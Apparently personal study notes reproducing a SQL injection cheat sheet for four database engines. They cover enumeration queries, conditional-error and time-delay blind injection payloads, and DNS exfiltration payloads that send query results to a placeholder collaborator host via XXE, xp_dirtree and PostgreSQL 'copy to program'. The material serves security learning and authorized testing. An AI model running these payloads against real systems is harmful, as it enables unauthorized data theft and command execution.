## String concatenation
| Database       |                          |
| -------------- | ------------------------ |
| **ORACLE**     | 'foo' &#124;&#124; 'bar' |
| **Microsoft**  | 'foo'+'bar'              |
| **PostgreSQL** | 'foo' &#124;&#124; 'bar' |
| **MySQL**      | CONCAT('foo','bar')      |
## Substring
| Database       |                           |
| -------------- | ------------------------- |
| **ORACLE**     | `SUBSTR('foobar', 4, 2)`    |
| **Microsoft**  | `SUBSTRING('foobar', 4, 2)` |
| **PostgreSQL** | `SUBSTRING('foobar', 4, 2)` |
| **MySQL**      | `SUBSTRING('foobar', 4, 2)` |
## Comments
| Database       |                             |
| -------------- | --------------------------- |
| **ORACLE**     | `--comment`                   |
| **Microsoft**  | `--comment`<br>`/*comment*/`  |
| **PostgreSQL** | `--comment`<br>`/*comment*/`  |
| **MySQL**      | `#comment`<br>`-- comment`<br>`/*comment*/` |

## Database version
[[Examining the database#Querying the database type and version]]

| Database       |                                                                   |
| -------------- | ----------------------------------------------------------------- |
| **ORACLE**     | `SELECT banner FROM v$version` <br>`SELECT version FROM v$instance` |
| **Microsoft**  | `SELECT @@version`                                                  |
| **PostgreSQL** | `SELECT version()`                                                  |
| **MySQL**      | `SELECT @@version`                                               |
## Database contents
[[Examining the database#Listing the contents of the database]]

| Database       |                                                                                                                          |
| -------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **ORACLE**     | `SELECT * FROM all_tables`<br>`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                           |
| **Microsoft**  | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| **PostgreSQL** | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`                                                                                                |
| **MySQL**      | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`                                                                                                    |
## Conditional errors
[[Blind SQL injection#Exploiting blind SQL injection by triggering conditional responses]]

| Database       |                                                                                    |
| -------------- | ---------------------------------------------------------------------------------- |
| **ORACLE**     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
| **Microsoft**  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                                                        |
| **PostgreSQL** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`                                                        |
| **MySQL**      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`                                                        |
## Batched queries
| Database       |                           |
| -------------- | ------------------------- |
| **ORACLE**     | `Does not support batched queries.`    |
| **Microsoft**  | `QUERY-1-HERE; QUERY-2-HERE` |
| **PostgreSQL** | `QUERY-1-HERE; QUERY-2-HERE` |
| **MySQL**      | `QUERY-1-HERE; QUERY-2-HERE` |
## Time delays
[[Blind SQL injection#Triggering time delays]]

| Database       |                                       |
| -------------- | ------------------------------------- |
| **ORACLE**     | `dbms_pipe.receive_message(('a'),10)` |
| **Microsoft**  | `WAITFOR DELAY '0:0:10'`              |
| **PostgreSQL** | `SELECT pg_sleep(10)`           |
| **MySQL**      | `SELECT sleep(10)`           |
## Conditional time delays
[[Blind SQL injection#Triggering time delays]]

| Database       |                           |
| -------------- | ------------------------- |
| **ORACLE**     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`    |
| **Microsoft**  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| **MySQL**      | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |

## DNS lookup
[[Blind SQL injection#Out-of-band techniques OAST]]

| Database       |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ORACLE**     | The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br> `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br> <br> The following technique works on fully patched Oracle installations, but requires elevated privileges:<br> `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| **Microsoft**  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **PostgreSQL** | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| **MySQL**      | The following technique works only on Windows: <br> `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a') SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`  
## DNS lookup with data exfiltration
[[Blind SQL injection#Out-of-band techniques OAST]]

### Oracle
```sql
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```
### Microsoft
```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```
### PostgreSQL
```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```
### MySQL
Works only on Windows
```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```